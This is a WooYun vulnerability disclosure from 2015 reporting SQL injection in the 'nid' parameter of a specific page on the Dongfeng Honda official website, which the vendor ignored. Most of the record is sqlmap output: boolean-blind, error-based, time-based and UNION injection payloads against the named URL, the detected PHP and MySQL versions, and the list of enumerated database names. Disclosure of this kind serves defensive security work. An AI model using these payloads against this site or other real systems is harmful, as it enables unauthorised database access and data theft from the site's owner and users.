wybug_title: 东风本田汽车官网sql注射
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-12-02：	细节已通知厂商并且等待厂商处理中									2015-12-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 东风本田汽车官网sql注射 详细说明：  东风本田汽车官网sql注射http://www.dongfeng-honda.com/crv_mediaReport.php?nid=440   漏洞证明：  Parameter: nid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: nid=440 AND 6059=6059    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: nid=440 AND (SELECT 1204 FROM(SELECT COUNT(*),CONCAT(0x717a767a71,(SELECT (ELT(1204=1204,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: nid=440 AND (SELECT * FROM (SELECT(SLEEP(5)))hvVc)    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: nid=-5337 UNION ALL SELECT NULL,CONCAT(0x717a767a71,0x4f794c42694c5a414a51,0x716a707671),NULL-- ---[16:17:10] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.9back-end DBMS: MySQL 5.0[16:17:10] [INFO] fetching database names[16:17:10] [INFO] the SQL query used returns 4 entries[16:17:10] [INFO] retrieved: information_schema[16:17:10] [INFO] retrieved: crossdriving[16:17:10] [INFO] retrieved: honda[16:17:10] [INFO] retrieved: hondaxyavailable databases [4]:                                                                                                              [*] crossdriving[*] honda[*] hondaxy[*] information_schema



   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-12-07 12:26 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
